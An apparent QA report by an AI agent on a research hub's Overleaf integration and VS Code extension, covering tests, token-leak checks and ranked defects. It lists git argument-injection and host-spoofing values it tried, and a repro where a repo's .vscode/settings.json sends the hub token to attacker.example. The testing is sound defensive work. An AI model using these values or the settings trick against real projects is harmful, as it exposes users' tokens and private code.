---
type: qa-report
owner_agent: qa
status: draft
sources:
  - "S05-brief.md (contract)"
  - "handoff-pipeline-eng.md, handoff-web-eng.md (claims verified here, not taken as facts)"
  - "../../architecture/threat-model.md (M2, M4, M5, M7, M10)"
  - "../S04/qa-S04.md (method, scripts)"
  - "code on branch s05-overleaf-vscode @ 776e69f: app/src/lemmata/hub/{overleaf,projects,routes,config}.py, app/src/lemmata/web/{app.js,hub/hub.js,vendor/cytoscape.min.js}, app/tests/{fake_overleaf,mock_hub}.py, vscode/**"
  - "https://code.visualstudio.com/api/references/contribution-points#contributes.configuration (setting scope; default is window)"
last_reviewed: 2026-11-05
---
# QA report: S05 Overleaf paper source + VS Code extension (branch `s05-overleaf-vscode`, commit 776e69f)

## Verdict: **block** (one fix, then ship with caveats)
The hub side holds up well: the Overleaf token does not leak through argv, `.git/config`, files, logs, API responses or MCP output; project-id parsing rejects every junk and injection value I tried; the zip -> Overleaf switch is atomic; a new Overleaf commit raises the expected paper alarm; Overleaf failures do not break the code sync. All test suites pass.

I am blocking on **D1**. The VS Code extension sends the hub Bearer token to whatever address `lemmata.serverUrl` holds, and that setting can come from a repo's `.vscode/settings.json`. That is a token-exfiltration path, which brief section C ("only http(s) to the configured server") is meant to exclude. The fix is about one line in `package.json`, plus binding the token to its origin. D2 is a medium-severity race that should be fixed in the same round. Merging to main still needs Juhyeong's approval.

## 1. Tests
| Suite | Result |
|---|---|
| `PYTHONPATH=app/src python3 -m unittest discover -s app/tests -p 'test_*.py'` | **110 OK** (22.3 s) |
| `cd vscode && npm ci && npm run compile` | OK. npm reports 3 moderate advisories in dev dependencies. The `.vsix` ships no `node_modules` (checked with `unzip -l`), so users are not exposed |
| `npm test` | **19/19 pass** |
| `npm run test:integration` (starts its own in-process hub + fake GitHub via `test/hub_fixture.py`; nothing to pre-start) | **8/8 pass**. The fixture process is gone afterwards |
| `npm run test:host` | not run: VS Code download is blocked here (same as web-eng) |

## 2. Overleaf end to end
Driver: `/tmp/qa-s05/scripts/e2e.py`, 84 checks, 83 pass. It runs the real `Hub` + `make_hub_server` in-process (same code as `hub serve`) against fake GitHub, a fake Overleaf (`app/tests/fake_overleaf.py`, Basic auth user `git`), a redirector and a sink. Git runs through the argv wrapper `/tmp/qa-s05/gitwrap/git`, which adds a 1 s sleep on clone/fetch. A 20 ms `ps` sampler ran the whole time. The sample paper is P2 -> P3 (appendix lr 1e-3) and the code repo is K2 -> K3.

### 2.1 Token handling (threat model M4, M10)
| Check | Result |
|---|---|
| `PUT /api/hub/overleaf/token` | 200 `{"configured":true}`. `overleaf.json` 0600, hub dir 0700. Code review: `write_private` does mkstemp + fchmod 0600 before writing, then an atomic replace |
| `GET /api/hub/status` | `overleaf_configured:true`, no token in the body |
| Unauthenticated PUT | 401 |
| Cookie PUT with an evil Origin or no Origin; cookie DELETE with no Origin | 403 |
| `GET` on the token route | 405, no token in the body |
| Bad tokens (space, empty, 301 chars, NUL, non-string) | 400, stored token unchanged. Surrounding whitespace is stripped by design |
| argv | 0 hits in 270 logged git argv lines (token and `base64("git:"+token)`). `ps` sampler: 1,160 samples with git clone/fetch running, **0 hits** |
| Header scoping | The header goes only into the child env as `GIT_CONFIG_KEY_0=http.<overleaf base>/.extraHeader`. That key is distinct from the GitHub key |
| `paper/.git/config` | origin = `<base>/<id>`, no token |
| Leak scan | Every API response body (status JSON, sync results, error messages such as 401/404/429/302), the MCP `list_projects`/`project_status`/`sync`/`alarms` output, and the driver's stdout: **0 hits** |
| `DELETE` | 200, `overleaf.json` removed, `overleaf_configured:false`, idempotent. Afterwards no file in the data dir holds the token |

### 2.2 Project id parsing and host pinning
- **Rejected with 400 and no project dir left (20 values):**
  - injection: `--upload-pack=touch /tmp/qa-s05-pwn`, `-uaaa…`, `ext::sh -c …`, `file:///etc/passwd`, `javascript:…//www.overleaf.com/project/<id>`
  - wrong host: `evil.example/project/<id>`, `www.overleaf.com.evil.example/…`, `www.overleaf.com@evil.example/…`, `www.overleaf.com\@evil.example/…`, `https://git.overleaf.com/<id>`
  - wrong scheme or port: `http://` scheme, port 8443
  - malformed id or path: `<id>/../x`, `../../<id>`, a non-hex id, `<id>%0a`
  - wrong type: a list, an object
  - share link `/read/…` → the share-link message
- No `/tmp/qa-s05-pwn` was created.
- Accepted:
  - the full URL
  - an upper-case id
  - the scheme-less `www.overleaf.com/project/<id>?foo#x`
- Structurally, only the 24-hex id is kept and appended to `base()`, so no host or argument injection is possible.
- `base()` pins the host. The config values `https://evil.example`, `http://evil.example`, `https://git.overleaf.com.evil.example`, `http://localhost.evil.example:80` and `http://127.0.0.1@evil.example` all resolve to `https://git.overleaf.com`. The config cannot be set over HTTP.
- **Redirects:** with the Overleaf base pointing at a 302 redirector, the clone fails with 502 and the redirect target (sink) receives **no request**. The redirector itself does receive the header, but it is the configured base.

### 2.3 Switch, sync, throttle, failures
| Check | Result |
|---|---|
| Create with `paper_overleaf` | 201, `paper_source {kind:overleaf, project_id}` in the summary and in `GET /api/hub/projects` |
| Zip upload to an Overleaf project | 409 `paper_is_overleaf` |
| Checkpoint → new Overleaf commit (P3) | Sync immediately after create: `paper.skipped:"rate_limited"` and 0 fetches (default 120 s). After moving `overleaf_last_fetch` back 121 s: `paper.changed:true`, `code.changed:false`, the old top-level `changed`/`head` are present. Alarm group `ev:commit:paper:<sha12>` with changed `tex:app:hparams` (golden A2). An immediate resync → `rate_limited` |
| Fake Overleaf answers 429 | 200; `paper.error` set; `code.changed:true` (K3 pulled in the same call) |
| Wrong token | sync `paper.error.code = overleaf_auth_failed` |
| Zip → Overleaf: failing switches | Every failure leaves `paper/` HEAD unchanged with no `paper.prev-*`: unknown id → 404 `overleaf_not_found`; bad id → 400; wrong token → 502 `overleaf_auth_failed`; no token → 409 `overleaf_token_missing`; redirect → 502 |
| Zip → Overleaf: success | 200 `{kind, project_id, head, versions}`. Exactly one `paper.prev-*` holding the old zip HEAD; `tmp/` empty; zip upload now 409 |
| Overleaf → zip | 200; `origin` removed from `paper/.git/config`; zip upload accepted again |
| Two concurrent `POST /sync` after the window | **2 Overleaf fetches** (expected at most 1). See D2 |

### 2.4 Hub UI under the real S04 CSP (Chromium via Playwright, 1280x800)
Driver: `/tmp/qa-s05/scripts/ui.py`. A `securitypolicyviolation` listener captured source file and column. Shots are in `/tmp/qa-s05/shots/`.
- **Overleaf card:** shown, with the link to `https://www.overleaf.com/user/settings` and a single password input. After Save the status reads configured. The token is not in the DOM after save or after a reload.
- **New project:**
  - Step 2 offers "Overleaf project link | Drop a zip", Overleaf by default.
  - A share link is rejected client-side ("That does not look like an Overleaf project link…") and no project is created.
  - A correct link → project created and connected (`paper_source` overleaf).
  - The repo description `<img onerror>` is rendered as text.
- **Top bar:** an Overleaf project shows "Paper: Overleaf ✓ (synced just now)" with no upload button. A zip project shows "Paper: zip ▾", whose dialog offers "Upload paper zip" / "Connect Overleaf…".
- **Console:**
  - The only errors are the expected CSP blocks of the fake avatar `http://example.invalid/a.png` (x3) on `/`.
  - **No CSP error on `/p/<pid>/`** under the real CSP.
- **Cause of web-eng's inline-style error:**
  - It comes only from `app/tests/mock_hub.py:68`, whose CSP lacks `style-src 'unsafe-inline'`. I re-ran with the mock's CSP patched into the real hub (`ui_strict.py`).
  - Exactly one violation appears per `/p/<pid>/` load: `style-src-elem`, source `vendor/cytoscape.min.js` line 31 col 168990.
  - At that point cytoscape inserts `<style id="__________cytoscape_stylesheet">.__________cytoscape_container { position: relative; }</style>` into `<head>`. It skips the insertion if an element with that id already exists. See D4.

## 3. VS Code extension review (security)
| Item | Result |
|---|---|
| Token storage | `context.secrets` only (`TOKEN_KEY`). Disconnect deletes it. Not in settings or files |
| Token logging | The only `log()` call site writes `HTTP <status> <code>`. Error messages carry the server's `error.message` (max 300 chars) and never the request. The client puts the token only in the `Authorization` header |
| Only the configured server | `fetch(base+path, {redirect:'error'})`, base = origin only. `normalizeServerUrl` refuses non-http(s), credentials, path/query/fragment. Plain http to a non-private host needs a modal confirmation, **but only in the Connect command** (see D1) |
| Untrusted text | Diagnostics, tree labels, descriptions and tooltips are plain strings (no `MarkdownString`, no webview). "Why?" is a read-only virtual text document. `clean()` strips ANSI/C0/C1/bidi controls. `markdownDescription` is used only for the extension's own setting text |
| Path escape | `safeRel` and `mapPath` return `null` for: `../../etc/passwd`, `code/../../etc/passwd`, `a/../../x`, `/etc/passwd`, `C:/x`, a backslash path, `.`, and an unknown repo. `%2e%2e/x` and `..∕x` (U+2215) map to literal file names inside the folder; `Uri.joinPath` treats them literally, so no escape. Repo key `__proto__` returns `Object.prototype` as the folder key; harmless, because the later `folderByKey.get` misses (D6) |
| Remote matching | `github.com.evil.com/…` and `evil.com/github.com/…` are rejected. Credentials in a remote are ignored |
| Untrusted workspaces | No `capabilities.untrustedWorkspaces` declared, so VS Code keeps the extension disabled in Restricted Mode and `git config --get-regexp` never runs there |

## 4. Defects (ranked)
1. **D1 (high, blocking; extension).** A repo can redirect the hub token.
   - **Cause:** `lemmata.serverUrl` has no `"scope"` in `vscode/package.json`, so it defaults to `window` scope and a workspace's `.vscode/settings.json` can set it. `Controller.setup()` (`src/extension.ts:66-69`) reads the merged value and builds a `HubClient` with the stored token. The plain-http warning only runs in `connect()`.
   - **Repro (Mac, trusted workspace):**
     - Commit `.vscode/settings.json` = `{"lemmata.serverUrl": "http://attacker.example:80"}` to a code repo or to the Overleaf project, which co-authors can write. Then open the folder.
     - Within 30 s, `attacker.example` receives `GET /api/hub/projects` with `Authorization: Bearer <hub device token>`.
     - That token gives full hub access: every project's private code and paper, triage, sync, and MCP.
   - **Verification:** by code review plus the documented VS Code setting-scope semantics. Not run in an extension host here.
   - **Fix:**
     - Add `"scope": "application"` (or `"machine"`) to `lemmata.serverUrl`.
     - Store the origin together with the token in SecretStorage and refuse to send the token to any other origin.
     - Add a unit test for the origin check.
2. **D2 (medium; hub).** `Manager.sync` reads `project.json` before it takes the per-project lock (`projects.py:530` vs `536`) and saves that stale copy at `:552`.
   - **Repro:** set `overleaf_last_fetch` more than 120 s back, then send two concurrent `POST /api/hub/projects/<pid>/sync` → fake Overleaf counts **2** fetches.
   - **Effect:** the 2-minute Overleaf throttle is bypassed whenever the 5-minute loop, "Sync now" in the UI or VS Code, and the MCP `sync` tool overlap.
   - **Same root cause:** a sync queued behind a `paper-source` switch can write the old `paper_source` back. I reasoned this from the code; my one timing attempt ended correctly as `zip`.
   - **Fix:** re-read `m` inside `oplock`.
3. **D3 (low; hub).** Overleaf 429 and redirect errors come back as `git_failed` with raw git text, e.g. "git fetch failed: fatal: unable to access '…/<id>/': The requested URL returned error: 429". They should map to `overleaf_rate_limited` with a plain message. There is no leak; the URL holds only the project id.
4. **D4 (low; test fidelity + M7).** `mock_hub.py` serves a stricter CSP than the real hub, so the screenshot harness shows an error users never see. The S04 M7 deviation (`style-src 'unsafe-inline'`) exists for exactly this cytoscape `<style>` injection, on the pages I loaded.
   - **Fix for both:**
     - Put `.__________cytoscape_container{position:relative}` in `app.css`.
     - Pre-create an element with id `__________cytoscape_stylesheet` in `web/index.html` (cytoscape then skips the injection).
     - Drop `'unsafe-inline'` from the hub CSP. CSSOM `.style.x =` assignments in `app.js` are not affected by CSP.
     - Make the mock reuse `routes.CSP`.
   - I only checked the graph view, top bar and paper dialog under the strict CSP. The CTO should re-run the other views before tightening.
5. **D5 (low; hub).** No size or file-count caps on Overleaf clones, unlike zip ingest (M6: 50 MB per file, 500 MB). The only party who can trigger this is the user's own Overleaf project, so the risk is disk use. `paper.prev-*` directories are never pruned.
6. **D6 (info; extension).** `mapPath` indexes a plain object with a server-supplied repo id (`__proto__` → `Object.prototype`). It is harmless today. Use `Object.hasOwn` or a `Map`.
7. **D7 (info; contract).** The web UI attaches Overleaf through `POST …/paper-source` after creating the project, not through `paper_overleaf`. It is documented in the handoff and is a reasonable choice (a bad link keeps the project).

## 5. Only the Macs or real services can verify
- **Real Overleaf** with Juhyeong's token:
  - 401 vs 403 vs 404 wording, which the error mapping in `_overleaf_git` reads
  - whether git sees a redirect from `git.overleaf.com` (with `followRedirects=false` it would fail)
  - real rate-limit responses, and the default branch
  - the first clone of a project with large images
- **D1 repro in a real VS Code** (trusted workspace + `.vscode/settings.json`), then the fix verified the same way. Also on the Mac:
  - tree, menus, status bar, input boxes
  - SecretStorage backed by the macOS keychain
  - "Open in Lemmata"
  - Restricted Mode behaviour
  - no http warning for `100.111.135.94` (private per `isPrivateHost`)
- **macOS `ps`:** argv only; `ps eww` shows the env of same-user processes on both OSes, which the threat model already accepts for the GitHub token.
- **Hub over Tailscale:**
  - the S05 pages in Safari/WebKit (Tauri) under the CSP
  - the 5-minute loop with both repos on the mini

## 6. Artefacts
- Scripts are in `/tmp/qa-s05/scripts/`: `e2e.py`, `ui.py`, `ui_strict.py`.
- Logs and outputs are in `/tmp/qa-s05/`: the git wrapper logs, `e2e.out`, `pytest.out`, `unit.out`, `integ.out`.
- Screenshots are in `/tmp/qa-s05/shots/`.
- All servers ran in-process in the drivers or in the npm fixture and are stopped; no hub, fake or test process is left running.
- I changed no code. The only file written in the repo is this report.
